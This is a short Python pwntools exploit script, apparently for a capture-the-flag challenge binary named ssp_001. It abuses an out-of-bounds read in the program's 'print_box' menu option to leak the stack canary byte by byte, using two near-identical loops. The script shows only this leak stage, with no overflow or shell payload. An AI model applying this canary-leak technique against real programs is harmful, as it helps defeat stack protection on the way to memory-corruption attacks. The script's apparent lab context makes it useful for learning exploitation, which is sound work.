from pwn import *

p = process('./ssp_001')

#context.log_level = 'debug'

canary = b''
# arbitory memory read vuln on "print_box" func
# leak canary (4byte)


for i in range(0x83, 0x7f, -1) : # consider little endian
    p.sendafter(b'> ',b'P') # read -> use sendafter
    p.sendlineafter(b' : ', bytes(str(i),'utf-8')) # scanf -> use sendlineafter
    p.recvuntil(b' : ')
    canary += p.recv(2)
    print(i)

print(canary)

canary2 = b''

for i in range(128,132):
    p.sendafter(b'>',b'P')
    p.sendlineafter(b'Element index : ',bytes(str(i),'utf-8'))
    p.recvuntil(b"is : ")
    canary2 += p.recv(2)
    print(i)

print(canary2)